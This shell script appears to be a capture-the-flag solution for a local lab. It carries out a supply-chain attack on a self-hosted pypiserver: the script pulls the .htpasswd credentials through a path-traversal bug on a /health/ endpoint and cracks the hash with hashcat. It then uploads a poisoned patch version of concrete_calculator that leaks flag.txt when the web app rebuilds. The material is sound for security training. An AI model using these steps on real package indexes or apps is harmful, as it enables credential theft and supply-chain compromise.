#!/bin/sh

# Play with webapp, see how it works, download library sources from /about/ page and inspect
# See that calculator_wrapper is rebuild every 60 seconds and that it imports concrete_calculator
# See that the package is built using Poetry, using Semantic Versioning for the concrete_calcualtor version
# Deduce that if we could upload a malicious patch version of concrete_calculator, it would be pulled and
#  imported into calculator_wrapper and run in our web app on rebuild

# Look at the self hosted pypiserver and take note of the version and the custom /health/ endpoint and 
#  required auth
# Read pypiserver README on github, see that it's possibly run with .htpasswd for auth
# Run directory fuzzer on custom /health/ endpoint to see it included .htpasswd file
# Use directory traversal/LFI bug to get pypiserver creds
curl -k https://127.0.0.1:42425/health/.htpasswd --output creds.txt

# Crack creds with rockyou dictionary
#./hashcat.bin -a 0 -m 101 "{SHA}FyQc7t5bmOBhQ9mGsYPSrSaVeM4=" rockyou.txt

# Log into pypisever and see it's hosting concrete_calcualtor
# Deduce that you can modify this package to perform an RCE on the web app

# Add user:pass to pypirc
# Copy FakePyPi config file
cp pypirc ~/.pypirc

# Download and unzip library source files
curl -k https://127.0.0.1:42424/about/concrete_calculator_source --output concrete_calculator.zip
unzip concrete_calculator.zip
rm concrete_calculator.zip

# Modify the library code to read flag.txt, encode it as an integer and return it from one of the methods
#  that calculated a concrete volume
# Patch library and setup file with exploit code and patch version, respectively
patch -ruN concrete_calculator/setup.py -i setup.py.patch
patch -ruN concrete_calculator/concrete_calculator/__init__.py -i __init__.py.patch

# Build patched library universal any-wheel, upload to FakePypi server, and wait for rebuild
cd concrete_calculator/
python setup.py bdist_wheel --universal register -r fakepypi upload -r fakepypi
cd ../
echo "\nWaiting 90 seconds for payload to be applied...\n"
sleep 90

# Trigger payload, retrieve flag, decode and print to screen
python decode.py
